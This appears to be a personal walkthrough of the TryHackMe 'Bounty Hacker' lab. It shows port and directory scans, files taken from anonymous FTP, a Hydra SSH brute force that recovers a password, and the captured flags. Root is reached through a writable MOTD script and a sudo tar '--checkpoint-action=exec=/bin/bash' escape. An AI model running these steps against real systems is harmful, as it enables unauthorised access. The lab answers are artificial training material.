# Enumeration
## Nmap
```color
rustscan -r 1-65535 -a 10.10.76.111 --ulimit 9000 -- -sCV -oN nmap/initial.md
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/scott/.rustscan.toml"
[~] Automatically increasing ulimit value to 9000.
Open 10.10.76.111:21
Open 10.10.76.111:22
Open 10.10.76.111:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")
[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-05 16:53 UTC

Initiating Ping Scan at 16:53
Scanning 10.10.76.111 [2 ports]
Completed Ping Scan at 16:53, 0.14s elapsed (1 total hosts)
Initiating Connect Scan at 16:53
Scanning bounty.thm (10.10.76.111) [3 ports]
Discovered open port 80/tcp on 10.10.76.111
Discovered open port 21/tcp on 10.10.76.111
Discovered open port 22/tcp on 10.10.76.111
Completed Connect Scan at 16:53, 0.14s elapsed (3 total ports)
Initiating Service scan at 16:53


PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.14.9.223
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:f8:df:a7:a6:00:6d:18:b0:70:2b:a5:aa:a6:14:3e (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCgcwCtWTBLYfcPeyDkCNmq6mXb/qZExzWud7PuaWL38rUCUpDu6kvqKMLQRHX4H3vmnPE/YMkQIvmz4KUX4H/aXdw0sX5n9jrennTzkKb/zvqWNlT6zvJBWDDwjv5g9d34cMkE9fUlnn2gbczsmaK6Zo337F40ez1iwU0B39e5XOqhC37vJuqfej6c/C4o5FcYgRqktS/kdcbcm7FJ+fHH9xmUkiGIpvcJu+E4ZMtMQm4bFMTJ58bexLszN0rUn17d2K4+lHsITPVnIxdn9hSc3UomDrWWg+hWknWDcGpzXrQjCajO395PlZ0SBNDdN+B14E0m6lRY9GlyCD9hvwwB
|   256 ec:c0:f2:d9:1e:6f:48:7d:38:9a:e3:bb:08:c4:0c:c9 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMCu8L8U5da2RnlmmnGLtYtOy0Km3tMKLqm4dDG+CraYh7kgzgSVNdAjCOSfh3lIq9zdwajW+1q9kbbICVb07ZQ=
|   256 a4:1a:15:a5:d4:b1:cf:8f:16:50:3a:7d:d0:d8:13:c2 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICqmJn+c7Fx6s0k8SCxAJAoJB7pS/RRtWjkaeDftreFw
80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel


```

## Ferox
```

ferox -u http://10.10.223.253 -w /usr/share/wordlists/dirb/common.txt -t 10 -x html,txt,php -o logs/ferox.md 

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 1.10.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.223.253
 🚀  Threads               │ 10
 📖  Wordlist              │ /usr/share/wordlists/dirb/common.txt
 🆗  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/1.10.3
 💾  Output File           │ logs/ferox.md
 💲  Extensions            │ [html, txt, php]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 ⏯   Press [ENTER] to pause|resume your scan
──────────────────────────────────────────────────
200       30l      153w      969c http://10.10.223.253/index.html
301        9l       28w      315c http://10.10.223.253/images

```

# FTP
```
150 Here comes the directory listing.
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
226 Directory send OK.

```

mget files from ftp

# SSH
## created a users.txt
- using names found on the webpage and ftp
```
hydra -L users.txt -P locks.txt ssh://10.10.223.253

[DATA] attacking ssh://10.10.223.253:22/
[22][ssh] host: 10.10.223.253   login: lin   password: RedDr4gonSynd1cat3

```


# Inital Access
- ### ssh login #ssh
	- creds lin:RedDr4gonSynd1cat3
	
## Enumeration
- user.txt
```
	lin@bountyhacker:~/Desktop$ ls -la
	total 12
	drwxr-xr-x  2 lin lin 4096 Jun  7  2020 .
	drwxr-xr-x 19 lin lin 4096 Jun  7  2020 ..
	-rw-rw-r--  1 lin lin   21 Jun  7  2020 user.txt
	
	lin@bountyhacker:~/Desktop$ cat user.txt
	THM{CR1M3_SyNd1C4T3}

```

- ## Linpeas
```
╔══════════╣ .sh files in path
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#script-binaries-in-path
/usr/sbin/alsa-info.sh
/usr/bin/gettext.sh
/usr/bin/amuFormat.sh

╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
/dev/mqueue
/dev/shm
/etc/update-motd.d/00-header **
/home/lin
/run/lock

sudo -l 
User lin may run the following commands on bountyhacker:
    (root) /bin/tar
```
# Privilege Escalation 
- ## Edit MOTD
		- cd /etc/update-motd.d
		- edit 00-header
			- add cat /root/root.txt to the end of file
	- log out and log back in via ssh
- get flag
	```
	┌──(kn1ght㉿Kali)-[~/THM/BountyHacker]
	└─$ ssh lin@bounty.thm
	lin@bounty.thm's password: 
	Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-101-generic x86_64)
	THM{80UN7Y_h4cK3r}

	 * Documentation:  https://help.ubuntu.com
	 * Management:     https://landscape.canonical.com
	 * Support:        https://ubuntu.com/advantage

	83 packages can be updated.
	0 updates are security updates.

	Last login: Sat Mar  5 18:07:05 2022 from 10.14.9.223
	lin@bountyhacker:~/Desktop$ 

	```

- ## Tar with sudo perms
	- #### GTFObins  [[gtfobins]]
```

lin@bountyhacker:~/Desktop$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
[sudo] password for lin: 
tar: Removing leading `/' from member names
root@bountyhacker:~/Desktop# id
uid=0(root) gid=0(root) groups=0(root)
 

```

Privilege Escalation Notes
---
* [[#Enumeration]] 
* [[#Initial Foothold]] 
* [[#Privilege Escalation]]